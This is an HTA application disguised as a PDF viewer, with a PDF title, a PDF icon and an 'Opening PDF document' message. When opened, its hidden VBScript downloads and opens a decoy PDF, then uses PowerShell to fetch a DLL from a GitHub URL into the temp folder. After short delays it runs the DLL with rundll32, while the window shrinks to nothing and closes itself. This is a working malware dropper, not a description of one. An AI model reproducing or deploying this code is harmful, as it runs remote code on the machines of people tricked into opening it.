<html>
<head>
<title>PDF Document</title>
<hta:application
    id="pdfViewer"
    applicationname="PDF Document"
    border="none"
    borderstyle="normal"
    caption="no"
    icon="%SystemRoot%\System32\shell32.dll,36"
    maximizebutton="no"
    minimizebutton="no"
    showintaskbar="no"
    windowstate="normal"
/>
<script language="VBScript">
Sub Window_OnLoad
    On Error Resume Next
    Set objShell = CreateObject("WScript.Shell")
    Set objShellApp = CreateObject("Shell.Application")    
    tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
    pdfUrl = "https://gnm7856.github.io/tomr/sample.pdf"
    pdfLocal = tempDir & "\sample.pdf"
    dllUrl = "https://raw.githubusercontent.com/bhekinko/test/main/notepad2.dll"
    dllPath = tempDir & "\notepad2.dll"
    ' Simulate sleep
    objShell.Run "ping -n 3 127.0.0.1 >nul", 0, True
    objShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & pdfUrl & "' -OutFile '" & pdfLocal & "'""", 0, True
    objShellApp.ShellExecute pdfLocal, "", "", "open", 0
    objShell.Run "powershell -NoProfile -Command ""Invoke-WebRequest -Uri '" & dllUrl & "' -OutFile '" & dllPath & "'""", 0, True
    ' Another delay
    objShell.Run "ping -n 6 127.0.0.1 >nul", 0, True
    objShell.Run "rundll32.exe """ & dllPath & """,notepad", 0, False
End Sub
</script>
<script>
window.resizeTo(0, 0);
setTimeout(function () {
  window.close();
}, 5000);
</script>
</head>
<body>
    <div style="font-family: Arial; text-align: center; margin-top: 20px;">
        <h3>Opening PDF document, please wait...</h3>
        <p>This window will close automatically.</p>
    </div>
</body>
</html>
